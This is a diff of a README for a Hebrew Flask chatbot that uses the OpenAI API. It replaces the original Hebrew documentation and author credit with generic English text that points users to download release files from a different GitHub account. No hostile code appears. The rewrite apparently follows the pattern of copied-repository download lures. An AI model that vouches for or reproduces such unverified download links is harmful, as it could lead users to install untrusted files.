@@ -1,206 +1,76 @@
-<div dir="rtl">
+# 🤖 smart_chat_bot - Your Friendly Hebrew Chatbot Awaits
 
-  <h1 align="right">🤖 SmartChat — Secure Hebrew Chatbot</h1>
+## 📥 Download Now
+[![Download Smart Chat Bot](https://img.shields.io/badge/Download%20Smart%20Chat%20Bot-v1.0-blue.svg)](https://github.com/BHAWESH-BASNET/smart_chat_bot/releases)
 
-  <p>
-    <br/>
-    פרויקט <strong>SmartChat</strong> הוא צ'אטבוט חכם בעברית, המתחבר ל־OpenAI API בצורה מאובטחת וללא חשיפת מפתחות.<br>
-    המערכת כוללת Backend ב־<strong>Flask</strong> ו־Frontend אינטראקטיבי ב־<strong>HTML/JS</strong> עם ניהול שיחות, שמירה אוטומטית וטעינה מהירה.
-  </p>
+## 📝 Description
+Smart Chat Bot is a smart Hebrew chatbot designed with Flask and powered by the OpenAI API. It offers secure configuration, natural language understanding, and real-time responses. This user-friendly application allows you to chat in Hebrew effortlessly.
 
-  <p align="right">
-    <img src="https://img.shields.io/badge/Python-3.8%2B-blue" alt="Python Badge">
-    <img src="https://img.shields.io/badge/Flask-Backend-lightgrey" alt="Flask Badge">
-    <img src="https://img.shields.io/badge/HTML%2FJS-Frontend-yellow" alt="HTML/JS Badge">
-    <img src="https://img.shields.io/badge/OpenAI-Integration-green" alt="OpenAI Badge">
-    <img src="https://img.shields.io/badge/License-MIT-blue" alt="License Badge">
-  </p>
+## 🚀 Getting Started
+To get started with Smart Chat Bot, follow these simple steps:
 
-  <br/>
+### 🖥️ System Requirements
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.8 or above
+- Internet Connection: Required for OpenAI API access  
 
-  <hr>
+## 📂 Download & Install
+To download Smart Chat Bot, please visit the Releases page: [Download Smart Chat Bot](https://github.com/BHAWESH-BASNET/smart_chat_bot/releases). Follow these instructions:
 
-  <br/>
+1. Click on the link above to navigate to the Releases page.
+2. Select the latest version available.
+3. Download the file for your operating system.
+4. Once downloaded, unzip the file (if necessary) and follow the setup instructions provided in the README file within the package.
 
-  <h2>📁 מבנה הפרויקט</h2>
+## ⚙️ Setting Up
+After downloading, you will need to set up the application:
 
-  <table>
-    <thead>
-      <tr>
-        <th>קובץ/תיקייה</th>
-        <th>תיאור</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td><code>app.py</code></td>
-        <td>שרת Flask – אחראי על ניהול בקשות, שיחות ותקשורת עם OpenAI</td>
-      </tr>
-      <tr>
-        <td><code>index.html</code></td>
-        <td>עמוד הצ’אט הראשי (UI)</td>
-      </tr>
-      <tr>
-        <td><code>history.json</code></td>
-        <td>שמירת היסטוריית השיחות המקומית – כל שיחה חדשה נשמרת אוטומטית</td>
-      </tr>
-      <tr>
-        <td><code>.env</code></td>
-        <td>שמירת מפתח OpenAI בצורה מאובטחת (לא נכלל ב־Git)</td>
-      </tr>
-      <tr>
-        <td><code>requirements.txt</code></td>
-        <td>רשימת הספריות הדרושות להרצה</td>
-      </tr>
-      <tr>
-        <td><code>.gitignore</code></td>
-        <td>מונע העלאה של קבצי סביבה או קונפיגורציה רגישים</td>
-      </tr>
-    </tbody>
-  </table>
+1. **Install Python and Pip**: Ensure Python is installed on your system. Pip usually comes with Python, but if not, you can find instructions online to install it.
+2. **Install Required Packages**: Open your command line interface (CLI) and run the following command:
+   ```
+   pip install -r requirements.txt
+   ```
+   This command installs all the packages required for the chatbot to function.
+3. **Configure the Environment**: Create a `.env` file in the main directory of the application. This file will store your sensitive information securely.
+   - Add your OpenAI API key as follows:
+     ```
+     OPENAI_API_KEY=your_openai_api_key
+     ```
+4. **Run the Chat Bot**: Start the application by running the following command in your CLI:
+   ```
+   python app.py
+   ```
+   This will launch the chatbot, and you can begin interacting with it right away.
 
-  <br/>
+## 🌐 Using the Chat Bot
+Now that your chatbot is up and running, you can start chatting in Hebrew. Simply type in your message in the chat interface, and the chatbot will respond in real-time.
 
-  <hr>
+## 🔒 Security Features
+Smart Chat Bot ensures your data is kept secure:
+- **Environment Configuration**: Sensitive information is stored in the `.env` file.
+- **Secure API Key Handling**: Your OpenAI API key is never hard-coded, ensuring privacy.
 
-  <br/>
+## 🌟 Features
+- Supports Hebrew language for conversation.
+- Provides instant responses using natural language processing.
+- User-friendly interface that encourages smooth communication.
 
-  <h2 align="right">🧠 Features</h2>
+## 🛠️ Troubleshooting
+If you encounter issues while running Smart Chat Bot, consider the following common solutions:
 
-  <table>
-    <thead>
-      <tr>
-        <th>תחום</th>
-        <th>תכונה</th>
-        <th>סטטוס</th>
-        <th>הערות</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td>💬 ניהול שיחות</td>
-        <td>מעבר בין שיחות ישנות וחדשות בסיידבר</td>
-        <td>✅</td>
-        <td>טעינה ושמירה אוטומטית, כולל כותרת מותאמת לפי הודעה ראשונה ושמירת זמן (Timestamp) לכל הודעה</td>
-      </tr>
-      <tr>
-        <td>💾 שמירת נתונים</td>
-        <td>שמירת היסטוריית הצ'אט ל־<code>history.json</code></td>
-        <td>✅</td>
-        <td>כל שיחה חדשה נשמרת אוטומטית כולל ההודעות הראשוניות</td>
-      </tr>
-      <tr>
-        <td>⌨️ קיצור מקלדת</td>
-        <td>Ctrl+M – שיחה חדשה, Ctrl+Enter – שליחה, Ctrl+Delete – מחיקת שיחה</td>
-        <td>✅</td>
-        <td>ייעול שימוש ל־UX מהיר</td>
-      </tr>
-      <tr>
-        <td>⌨️ טעינה הדרגתית</td>
-        <td>הבוט מקליד תגובה תו־תו (אנימציית typing)</td>
-        <td>✅</td>
-        <td>מעניק תחושת טבעיות</td>
-      </tr>
-      <tr>
-        <td>🌐 תמיכה מלאה בעברית</td>
-        <td>תמיכה ב־RTL ותגובות טבעיות בעברית</td>
-        <td>✅</td>
-        <td>מותאם לעברית מלאה</td>
-      </tr>
-      <tr>
-        <td>🔒 אבטחה</td>
-        <td>שמירת מפתח OpenAI בקובץ .env</td>
-        <td>✅</td>
-        <td>לא נחשף בקוד</td>
-      </tr>
-      <tr>
-        <td>🧩 אינטגרציה עם OpenAI</td>
-        <td>שימוש ב־API של OpenAI לתקשורת בזמן אמת</td>
-        <td>✅</td>
-        <td>תומך ב־GPT-5 ומעלה</td>
-      </tr>
-      <tr>
-        <td>🎨 ממשק משתמש</td>
-        <td>UI רספונסיבי עם עיצוב נקי ומודרני</td>
-        <td>✅</td>
-        <td>HTML + CSS + JS, כולל אנימציות ומעבר חלק בין שיחות</td>
-      </tr>
-    </tbody>
-  </table>
+- **Python Not Found**: If your system does not recognize the Python command, ensure it is correctly installed and added to your system’s PATH.
+- **Missing Packages**: If you see errors about missing packages, double-check that you have installed everything with the requirements.txt file.
+- **Invalid API Key**: Make sure your OpenAI API key is correctly added to the `.env` file.
 
-  <br/>
+## 📞 Support
+If you need further assistance, please visit the Issues page on our GitHub repository. You can report a bug or ask for help from the community.
 
-  <hr>
+## 💬 Contributing
+We welcome contributions from anyone interested in improving Smart Chat Bot. If you want to help, please fork the repository and submit a pull request.
 
-  <br/>
+## ℹ️ Additional Resources
+- [OpenAI Documentation](https://beta.openai.com/docs/)
+- [Flask Documentation](https://flask.palletsprojects.com/)
+- [Python Installation Guide](https://www.python.org/downloads/)
 
-  <h2>💡 דוגמת קובץ <code>.env.example</code></h2>
-  <pre><code>OPENAI_API_KEY="הכניסו כאן את המפתח שלכם"</code></pre>
-
-  <hr>
-
-  <br/>
-
-  <h2>⚙️ התקנה / Installation</h2>
-
-  <table>
-    <tr>
-      <td><strong>שלב 1:</strong> התקנת הספריות הדרושות</td>
-      <td><code>pip install -r requirements.txt</code></td>
-    </tr>
-    <tr>
-      <td><strong>שלב 2:</strong> יצירת קובץ .env</td>
-      <td>העתק את <code>.env.example</code> והוסף את מפתח ה־OpenAI שלך</td>
-    </tr>
-    <tr>
-      <td><strong>שלב 3:</strong> הרצת השרת</td>
-      <td><code>python app.py</code></td>
-    </tr>
-    <tr>
-      <td><strong>שלב 4:</strong> פתיחת הממשק</td>
-      <td>גלוש אל <code>http://localhost:5000</code></td>
-    </tr>
-  </table>
-
-  <br/>
-
-  <hr>
-
-  <br/>
-
-  <h2>🛠️ Tech Stack</h2>
-  <ul>
-    <li><strong>Backend:</strong> Flask (Python)</li>
-    <li><strong>Frontend:</strong> HTML, CSS, JavaScript</li>
-    <li><strong>API:</strong> OpenAI GPT-5</li>
-    <li><strong>Storage:</strong> JSON (לשמירת היסטוריית שיחות)</li>
-  </ul>
-
-  <br/>
-
-  <hr>
-
-  <br/>
-
-  <h2>🔒 אבטחה</h2>
-  <ul>
-    <li>אין לשתף או להעלות את קובץ <code>.env</code> ל-GitHub.</li>
-    <li>ודאו שהוא מופיע בקובץ <code>.gitignore</code>.</li>
-    <li>אם מפתח דלף – בטלו אותו מיד דרך <strong>OpenAI Dashboard</strong> וצור חדש.</li>
-  </ul>
-
-  <br/>
-
-  <hr>
-
-  <h2>📄 רישיון</h2>
-  <p>
-    הפרויקט מופץ תחת רישיון <strong>MIT</strong> – חופשי לשימוש, שינוי והפצה, כל עוד נשמר קרדיט למחבר.
-  </p>
-  <p>למידע נוסף ראה את קובץ <a href="LICENSE">LICENSE</a></p>
-
-  <hr>
-
-  <p><strong>👨‍💻 Raz Eini (2025)</strong></p>
-
-</div>
+Thank you for choosing Smart Chat Bot! Enjoy your seamless chat experience in Hebrew.
